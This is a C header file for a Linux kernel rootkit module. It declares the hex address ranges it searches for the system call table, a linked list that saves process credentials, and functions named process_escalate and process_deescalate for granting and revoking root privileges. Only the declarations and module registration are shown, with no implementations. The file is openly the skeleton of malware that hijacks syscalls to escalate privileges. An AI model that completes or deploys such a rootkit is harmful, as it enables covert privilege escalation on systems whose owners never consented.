#ifndef rootkit_H
#define rootkit_H
#endif

#include <linux/errno.h>
#include <linux/slab.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/version.h>

#if defined __i386__
    #define START_ADDRESS 0xc0000000
    #define END_ADDRESS 0xd0000000
	typedef unsigned int addr_size;
#elif defined __x86_64__
    #define START_ADDRESS 0xffffffff81000000
    #define END_ADDRESS 0xffffffffa2000000
    typedef unsigned long addr_size;
#endif


/* global variables */
static addr_size *sys_call_table_addr;

/* custom struct to store pids */
typedef struct pid_node {
	pid_t 		pid;
	kuid_t uid, suid, euid, fsuid;
	kgid_t gid, sgid, egid, fsgid;
	struct pid_node *prev, *next;
} PID_NODE;

/* insert pid node */
PID_NODE *insert_pid_node(PID_NODE **head, PID_NODE *new_node);

/* find pid node by pid */
PID_NODE *find_pid_node(PID_NODE **head, pid_t pid);

/* delete pid node by pid */
void delete_pid_node(PID_NODE **head, PID_NODE *node);

/* process escalation method */
void process_escalate(pid_t pid);

/* process descalation method */
void process_deescalate(pid_t pid);

/* module cleanup */
void __exit rootkit_exit(void);

/* module initialization */
int __init rootkit_init(void);

/**
 * Finds a system call table. This should be done during compile time
 *
 * @return 0 if success, EFAULT if failure
 */
static int locate_sys_call_table(void);

MODULE_LICENSE("GPL");

module_init(rootkit_init);
module_exit(rootkit_exit);
